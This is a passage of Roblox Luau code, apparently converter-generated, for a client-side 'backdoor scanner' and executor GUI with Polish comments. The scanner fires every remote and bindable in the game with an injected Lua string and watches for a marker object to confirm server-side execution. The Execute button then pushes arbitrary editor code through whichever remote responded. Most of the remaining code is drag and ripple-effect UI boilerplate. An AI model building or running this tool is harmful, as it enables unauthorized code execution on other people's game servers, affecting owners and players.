G2L["99"]["Text"] = [[]];
G2L["99"]["Name"] = [[Comments_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.Custom_
G2L["9a"] = Instance.new("TextLabel", G2L["93"]);
G2L["9a"]["ZIndex"] = 2;
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["TextSize"] = 14;
G2L["9a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9a"]["TextColor3"] = Color3.fromRGB(98, 176, 240);
G2L["9a"]["BackgroundTransparency"] = 1;
G2L["9a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9a"]["Text"] = [[]];
G2L["9a"]["Name"] = [[Custom_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.Tokens_
G2L["9b"] = Instance.new("TextLabel", G2L["93"]);
G2L["9b"]["ZIndex"] = 2;
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["TextSize"] = 14;
G2L["9b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9b"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9b"]["TextColor3"] = Color3.fromRGB(181, 181, 181);
G2L["9b"]["BackgroundTransparency"] = 1;
G2L["9b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9b"]["Text"] = [[]];
G2L["9b"]["Name"] = [[Tokens_]];


-- StarterGui.ScreenGui.Exec.Scroll.Lines
G2L["9c"] = Instance.new("TextLabel", G2L["92"]);
G2L["9c"]["BorderSizePixel"] = 0;
G2L["9c"]["TextSize"] = 14;
G2L["9c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9c"]["BackgroundTransparency"] = 1;
G2L["9c"]["Size"] = UDim2.new(0.02891, 0, 1, 0);
G2L["9c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9c"]["Text"] = [[  1]];
G2L["9c"]["Name"] = [[Lines]];


-- StarterGui.ScreenGui.Exec.Scroll.LLine
G2L["9d"] = Instance.new("Frame", G2L["92"]);
G2L["9d"]["ZIndex"] = 50;
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(82, 82, 82);
G2L["9d"]["Size"] = UDim2.new(0, 1, 1, 0);
G2L["9d"]["Position"] = UDim2.new(0.035, 0, 0, 0);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9d"]["Name"] = [[LLine]];


-- StarterGui.ScreenGui.Exec.Scroll.Editor
G2L["9e"] = Instance.new("LocalScript", G2L["92"]);
G2L["9e"]["Name"] = [[Editor]];


-- StarterGui.ScreenGui.Scanner.Scan.LocalScript
local function C_a()
local script = G2L["a"];
	
	local button = script.Parent
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Workspace = game:GetService("Workspace")
	local StarterGui = game:GetService("StarterGui")
	local StarterPack = game:GetService("StarterPack")
	local StarterPlayer = game:GetService("StarterPlayer")
	local Lighting = game:GetService("Lighting")
	local Teams = game:GetService("Teams")
	local ServerScriptService = game:GetService("ServerScriptService")
	local ServerStorage = game:GetService("ServerStorage")
	local Players = game:GetService("Players")
	
	local remoteTimeout = 1.0
	
	
	local exec = script.Parent.Parent.Parent.Exec
	local scanner = script.Parent.Parent.Parent.Scanner
	
	exec.Visible = false
	scanner.Visible = true
	
	-- Globalny backdoor w ReplicatedStorage
	if not ReplicatedStorage:FindFirstChild("AcquiredRemote") then
		local obj = Instance.new("ObjectValue")
		obj.Name = "AcquiredRemote"
		obj.Parent = ReplicatedStorage
		obj.Value = nil
	end
	
	local function getFullPath(obj)
		local path = obj.Name
		local parent = obj.Parent
		while parent and parent ~= game do
			path = parent.Name .. "/" .. path
			parent = parent.Parent
		end
		return path
	end
	
	local function randomMarker(len)
		local name = ""
		for i = 1, len do
			name = name .. string.char(math.random(65, 90))
		end
		return name
	end
	
	local backdoorTypes = {
		{
			class = "RemoteEvent",
			desc = "RemoteEvent FireServer",
			activate = function(obj, marker)
				obj:FireServer('Instance.new("Model",workspace).Name="'..marker..'"')
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
		{
			class = "RemoteFunction",
			desc = "RemoteFunction InvokeServer",
			activate = function(obj, marker)
				task.spawn(function() obj:InvokeServer('Instance.new("Model",workspace).Name="'..marker..'"') end)
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
		{
			class = "BindableEvent",
			desc = "BindableEvent Fire",
			activate = function(obj, marker)
				obj:Fire(marker)
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
		{
			class = "BindableFunction",
			desc = "BindableFunction Invoke",
			activate = function(obj, marker)
				task.spawn(function() obj:Invoke(marker) end)
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
	}
	
	
	local scanServices = {
		ReplicatedStorage,
		Workspace,
		StarterGui,
		StarterPack,
		StarterPlayer,
		Lighting,
		Teams,
		ServerScriptService,
		ServerStorage,
		Players,
	}
	
	local function scanRemotesAsync(objects, timeout)
		local checkedTotal = 0
		local foundRemote = nil
		local foundDetails = nil
		local scannedInfo = {}
	
		local threads = {}
	
		for _, obj in ipairs(objects) do
			for _, t in ipairs(backdoorTypes) do
				if obj:IsA(t.class) then
					checkedTotal = checkedTotal + 1
					local marker = randomMarker(24)
					local info = string.format("[SCAN] Path: %s | Type: %s | Name: %s", getFullPath(obj), t.class, obj.Name)
					table.insert(scannedInfo, info)
					print(info)
					table.insert(threads, task.spawn(function()
						t.activate(obj, marker)
						local t1 = tick()
						repeat task.wait(0.01) until t.detect(marker) or tick() - t1 > timeout
						if t.detect(marker) and not foundRemote then
							foundRemote = obj
							foundDetails = {
								path = getFullPath(obj),
								class = t.class,
								desc = t.desc,
								marker = marker,
							}
							print(string.format("[BACKDOOR FOUND] %s | Type: %s | Desc: %s", foundDetails.path, foundDetails.class, t.desc))
						end
					end))
				end
			end
			if foundRemote then break end
		end
	
		local start = tick()
		repeat
			task.wait(0.03)
		until foundRemote or tick() - start > (timeout + 2)
		return foundRemote, checkedTotal, foundDetails, scannedInfo
	end
	
	button.MouseButton1Click:Connect(function()
		if ReplicatedStorage.AcquiredRemote.Value then
			ReplicatedStorage.AcquiredRemote.Value = nil
		end
	
		exec.Visible = false
		scanner.Visible = true
	
		local startTime = tick()
		local checkedTotal = 0
		local foundRemote = nil
		local foundDetails = nil
		local scannedInfo = {}
	
	
		local toScan = {}
		for _, service in ipairs(scanServices) do
			for _, obj in ipairs(service:GetDescendants()) do
				table.insert(toScan, obj)
			end
		end
	
		foundRemote, checkedTotal, foundDetails, scannedInfo = scanRemotesAsync(toScan, remoteTimeout)
	
		local elapsed = string.format("%.2f", tick() - startTime)
	
		print("\n=== SCANNED OBJECTS SUMMARY ===")
		for _, v in ipairs(scannedInfo) do print(v) end
		print("=== END OF SCAN ===\n")
	
		if foundRemote then
			ReplicatedStorage.AcquiredRemote.Value = foundRemote
			exec.Visible = true
			scanner.Visible = false
			StarterGui:SetCore("SendNotification", {
				Title = "Backdoor found!",
				Text = "Time: "..elapsed.."s\nChecked: "..checkedTotal.." remotes/bindables",
				Icon = "rbxassetid://109509735989414",
				Duration = 5
			})
		else
			StarterGui:SetCore("SendNotification", {
				Title = "No backdoors :(",
				Text = "Time: "..elapsed.."s\nChecked: "..checkedTotal.." remotes/bindables\nNo working backdoors found",
				Icon = "rbxassetid://109509735989414",
				Duration = 5
			})
			exec.Visible = false
			scanner.Visible = true
		end
	end)
end;
task.spawn(C_a);
-- StarterGui.ScreenGui.Scanner.LocalScript
local function C_b()
local script = G2L["b"];
	function dragify(Main)
		local dragToggle = false
		local dragInput = nil
		local dragStart = nil
		local startPos = nil
		local dragSpeed = 1
		local UserInputService = game:GetService("UserInputService")
		local TweenService = game:GetService("TweenService")
	
		local function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + Delta.X,
				startPos.Y.Scale, startPos.Y.Offset + Delta.Y
			)
			TweenService:Create(Main, TweenInfo.new(dragSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = Position}):Play()
		end
	
		Main.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragToggle = true
				dragStart = input.Position
				startPos = Main.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
	
		Main.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end
	
	dragify(script.Parent)
end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Exec.LocalScript
local function C_10()
local script = G2L["10"];
	function dragify(Main)
		local dragToggle = false
		local dragInput = nil
		local dragStart = nil
		local startPos = nil
		local dragSpeed = 1
		local UserInputService = game:GetService("UserInputService")
		local TweenService = game:GetService("TweenService")
	
		local function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + Delta.X,
				startPos.Y.Scale, startPos.Y.Offset + Delta.Y
			)
			TweenService:Create(Main, TweenInfo.new(dragSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = Position}):Play()
		end
	
		Main.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragToggle = true
				dragStart = input.Position
				startPos = Main.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
	
		Main.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end
	
	dragify(script.Parent)
end;
task.spawn(C_10);
-- StarterGui.ScreenGui.Exec.Execute.LocalScript
local function C_14()
local script = G2L["14"];
	-- Superszybki, pełny kod do przycisku "Execute" w frame Exec
	-- Funkcje: pobiera znaleziony backdoor z ReplicatedStorage.AcquiredRemote, wysyła kod z edytora poprzez niego
	
	local button = script.Parent -- ustaw na TextButton Execute
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	local editor = script.Parent.Parent.Scroll.Code -- dostosuj ścieżkę do swojego edytora (np. Frame.Exec.Scroll.Code)
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = game:GetService("TweenService"):Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	
		-- Pobierz kod z edytora
		local codeStr = editor.Text
	
		-- Pobierz znaleziony backdoor z ReplicatedStorage.AcquiredRemote
		local remoteObj = ReplicatedStorage:FindFirstChild("AcquiredRemote") and ReplicatedStorage.AcquiredRemote.Value
	
		if remoteObj then
			if remoteObj:IsA("RemoteEvent") then
				remoteObj:FireServer(codeStr)
				StarterGui:SetCore("SendNotification", {
					Title = "Code sent!",
					Text = "Sent code via RemoteEvent.",
					Icon = "rbxassetid://109509735989414",
					Duration = 4
				})
			elseif remoteObj:IsA("RemoteFunction") then
				task.spawn(function() remoteObj:InvokeServer(codeStr) end)
				StarterGui:SetCore("SendNotification", {
					Title = "Code sent!",
					Text = "Sent code via RemoteFunction.",
					Icon = "rbxassetid://109509735989414",
					Duration = 4
				})
			elseif remoteObj:IsA("BindableEvent") then
				remoteObj:Fire(codeStr)
				StarterGui:SetCore("SendNotification", {
					Title = "Code sent!",
					Text = "Sent code via BindableEvent.",
					Icon = "rbxassetid://109509735989414",
					Duration = 4
				})
			elseif remoteObj:IsA("BindableFunction") then
				task.spawn(function() remoteObj:Invoke(codeStr) end)
				StarterGui:SetCore("SendNotification", {
					Title = "Code sent!",
					Text = "Sent code via BindableFunction.",
					Icon = "rbxassetid://109509735989414",
					Duration = 4
				})
			else
				StarterGui:SetCore("SendNotification", {
					Title = "Error",
					Text = "Backdoor type not supported.",
					Icon = "rbxassetid://109509735989414",
					Duration = 4
				})
			end
		else
			StarterGui:SetCore("SendNotification", {
				Title = "No backdoor!",
				Text = "No backdoor found. Use scanner first.",
				Icon = "rbxassetid://109509735989414",
				Duration = 4
			})
		end
	end)
end;
task.spawn(C_14);
-- StarterGui.ScreenGui.Exec.Clear.LocalScript
local function C_18()
local script = G2L["18"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	-- Ustal ścieżkę do edytora tekstu
	local codeBox = button.Parent.Scroll.Code -- Zmień ścieżkę jeśli Twój GUI jest inaczej zorganizowany
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	
		-- Wyczyść tekst z edytora
		if codeBox and codeBox:IsA("TextBox") then
			codeBox.Text = ""
		end
	end)
end;
task.spawn(C_18);
-- StarterGui.ScreenGui.Exec.R6.LocalScript
local function C_1c()
local script = G2L["1c"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_1c);
-- StarterGui.ScreenGui.Exec.Reset.LocalScript
local function C_20()
local script = G2L["20"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_20);
-- StarterGui.ScreenGui.Exec.Scan.LocalScript
local function C_24()
local script = G2L["24"];
	
	local button = script.Parent
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Workspace = game:GetService("Workspace")
	local StarterGui = game:GetService("StarterGui")
	local StarterPack = game:GetService("StarterPack")
	local StarterPlayer = game:GetService("StarterPlayer")
	local Lighting = game:GetService("Lighting")
	local Teams = game:GetService("Teams")
	local ServerScriptService = game:GetService("ServerScriptService")
	local ServerStorage = game:GetService("ServerStorage")
	local Players = game:GetService("Players")
	
	local remoteTimeout = 2.0
	
	
	
	
	-- Globalny backdoor w ReplicatedStorage
	if not ReplicatedStorage:FindFirstChild("AcquiredRemote") then
		local obj = Instance.new("ObjectValue")
		obj.Name = "AcquiredRemote"
		obj.Parent = ReplicatedStorage
		obj.Value = nil
	end
	
	local function getFullPath(obj)
		local path = obj.Name
		local parent = obj.Parent
		while parent and parent ~= game do
			path = parent.Name .. "/" .. path
			parent = parent.Parent
		end
		return path
	end
	
	local function randomMarker(len)
		local name = ""
		for i = 1, len do
			name = name .. string.char(math.random(65, 90))
		end
		return name
	end
	
	local backdoorTypes = {
		{
			class = "RemoteEvent",
			desc = "RemoteEvent FireServer",
			activate = function(obj, marker)
				obj:FireServer('Instance.new("Model",workspace).Name="'..marker..'"')
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
		{
			class = "RemoteFunction",
			desc = "RemoteFunction InvokeServer",
			activate = function(obj, marker)
				task.spawn(function() obj:InvokeServer('Instance.new("Model",workspace).Name="'..marker..'"') end)
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
		{
			class = "BindableEvent",
			desc = "BindableEvent Fire",
			activate = function(obj, marker)
				obj:Fire(marker)
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
		{
			class = "BindableFunction",
			desc = "BindableFunction Invoke",
			activate = function(obj, marker)
				task.spawn(function() obj:Invoke(marker) end)
			end,
			detect = function(marker)
				return workspace:FindFirstChild(marker)
			end,
		},
	}
	
	
	local scanServices = {
		ReplicatedStorage,
		Workspace,
		StarterGui,
		StarterPack,
		StarterPlayer,
		Lighting,
		Teams,
		ServerScriptService,
		ServerStorage,
		Players,
	}
	
	local function scanRemotesAsync(objects, timeout)
		local checkedTotal = 0
		local foundRemote = nil
		local foundDetails = nil
		local scannedInfo = {}
	
		local threads = {}
	
		for _, obj in ipairs(objects) do
			for _, t in ipairs(backdoorTypes) do
				if obj:IsA(t.class) then
					checkedTotal = checkedTotal + 1
					local marker = randomMarker(24)
					local info = string.format("[SCAN BACKUP] Path: %s | Type: %s | Name: %s", getFullPath(obj), t.class, obj.Name)
					table.insert(scannedInfo, info)
					print(info)
					table.insert(threads, task.spawn(function()
						t.activate(obj, marker)
						local t1 = tick()
						repeat task.wait(0.01) until t.detect(marker) or tick() - t1 > timeout
						if t.detect(marker) and not foundRemote then
							foundRemote = obj
							foundDetails = {
								path = getFullPath(obj),
								class = t.class,
								desc = t.desc,
								marker = marker,
							}
							print(string.format("[BACKDOOR FOUND] %s | Type: %s | Desc: %s", foundDetails.path, foundDetails.class, t.desc))
						end
					end))
				end
			end
			if foundRemote then break end
		end
	
		local start = tick()
		repeat
			task.wait(0.03)
		until foundRemote or tick() - start > (timeout + 2)
		return foundRemote, checkedTotal, foundDetails, scannedInfo
	end
	
	button.MouseButton1Click:Connect(function()
		if ReplicatedStorage.AcquiredRemote.Value then
			ReplicatedStorage.AcquiredRemote.Value = nil
		end
	
		local startTime = tick()
		local checkedTotal = 0
		local foundRemote = nil
		local foundDetails = nil
		local scannedInfo = {}
	
	
		local toScan = {}
		for _, service in ipairs(scanServices) do
			for _, obj in ipairs(service:GetDescendants()) do
				table.insert(toScan, obj)
			end
		end
	
		foundRemote, checkedTotal, foundDetails, scannedInfo = scanRemotesAsync(toScan, remoteTimeout)
	
		local elapsed = string.format("%.2f", tick() - startTime)
	
		print("\n=== SCANNED OBJECTS SUMMARY ===")
		for _, v in ipairs(scannedInfo) do print(v) end
		print("=== END OF SCAN ===\n")
	
		if foundRemote then
			ReplicatedStorage.AcquiredRemote.Value = foundRemote
			StarterGui:SetCore("SendNotification", {
				Title = "Backdoor found!",
				Text = "Time: "..elapsed.."s\nChecked: "..checkedTotal.." remotes/bindables",
				Icon = "rbxassetid://109509735989414",
				Duration = 5
			})
		else
			StarterGui:SetCore("SendNotification", {
				Title = "No backdoors :(",
				Text = "Time: "..elapsed.."s\nChecked: "..checkedTotal.." remotes/bindables\nNo working backdoors found",
				Icon = "rbxassetid://109509735989414",
				Duration = 5
			})
		end
	end)
end;
task.spawn(C_24);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria.LocalScript
local function C_2f()
local script = G2L["2f"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_2f);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_35()
local script = G2L["35"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_35);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_39()
local script = G2L["39"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_39);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_3d()
local script = G2L["3d"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_3d);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_41()
local script = G2L["41"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_45()
local script = G2L["45"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
